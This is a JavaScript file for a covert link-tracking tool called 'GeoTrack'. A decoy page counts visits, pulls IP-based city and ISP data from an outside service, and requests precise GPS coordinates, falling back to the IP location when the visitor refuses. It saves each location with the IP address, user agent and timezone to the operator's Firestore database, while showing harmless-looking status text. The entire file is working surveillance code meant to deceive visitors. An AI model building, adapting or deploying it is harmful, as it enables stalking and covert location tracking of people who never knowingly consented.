// ============================================================
//  TRACKER LOGIC
//  Runs on track.html — silently captures the visitor's
//  geolocation and writes it to Firestore.
// ============================================================

(async function () {
  // ── Get link ID from URL query param ──────────────────────
  const params = new URLSearchParams(window.location.search);
  const linkId = params.get('id');

  if (!linkId) {
    // No ID — just show the decoy page, do nothing
    return;
  }

  // ── Check Firebase is configured ──────────────────────────
  if (!isConfigured()) {
    console.warn('GeoTrack: Firebase not configured.');
    return;
  }

  // ── Increment hit counter immediately ─────────────────────
  try {
    await db.collection('tracking_links').doc(linkId).update({
      hitCount: firebase.firestore.FieldValue.increment(1)
    });
  } catch (e) {
    // Link may not exist — silently ignore
    console.warn('GeoTrack: Could not increment hit count.', e);
  }

  // ── Fetch IP / city info (best-effort, no API key needed) ─
  let ipData = {};
  try {
    const res  = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
    ipData     = await res.json();
  } catch (_) { /* ignore */ }

  // ── Build base location record ─────────────────────────────
  const baseRecord = {
    timestamp:  firebase.firestore.FieldValue.serverTimestamp(),
    userAgent:  navigator.userAgent,
    language:   navigator.language || '',
    platform:   navigator.platform || '',
    ip:         ipData.ip      || '',
    city:       ipData.city    || '',
    region:     ipData.region  || '',
    country:    ipData.country_name || '',
    org:        ipData.org     || '',
    timezone:   ipData.timezone || '',
    // IP-based coords as fallback
    ipLat:      ipData.latitude  || null,
    ipLng:      ipData.longitude || null,
  };

  // ── Try GPS geolocation ────────────────────────────────────
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // Success — precise GPS location
        const record = {
          ...baseRecord,
          lat:      pos.coords.latitude,
          lng:      pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          source:   'gps'
        };
        await saveLocation(linkId, record);
        updateStatus('Location captured. You may close this tab.');
      },
      async (err) => {
        // Denied or unavailable — fall back to IP location
        console.warn('GeoTrack: GPS denied, using IP fallback.', err.message);
        const record = {
          ...baseRecord,
          lat:      ipData.latitude  || null,
          lng:      ipData.longitude || null,
          accuracy: null,
          source:   'ip'
        };
        if (record.lat && record.lng) {
          await saveLocation(linkId, record);
        }
        updateStatus('Loading complete.');
      },
      {
        enableHighAccuracy: true,
        timeout:            10000,
        maximumAge:         0
      }
    );
  } else {
    // Geolocation not supported — IP only
    const record = {
      ...baseRecord,
      lat:    ipData.latitude  || null,
      lng:    ipData.longitude || null,
      accuracy: null,
      source: 'ip'
    };
    if (record.lat && record.lng) {
      await saveLocation(linkId, record);
    }
    updateStatus('Loading complete.');
  }

  // ── Save location record to Firestore ─────────────────────
  async function saveLocation(id, record) {
    try {
      await db.collection('tracking_links').doc(id)
               .collection('locations').add(record);
    } catch (e) {
      console.warn('GeoTrack: Failed to save location.', e);
    }
  }

  // ── Update the decoy status text ──────────────────────────
  function updateStatus(msg) {
    const el = document.getElementById('trackStatus');
    if (el) el.textContent = msg;
  }

})();
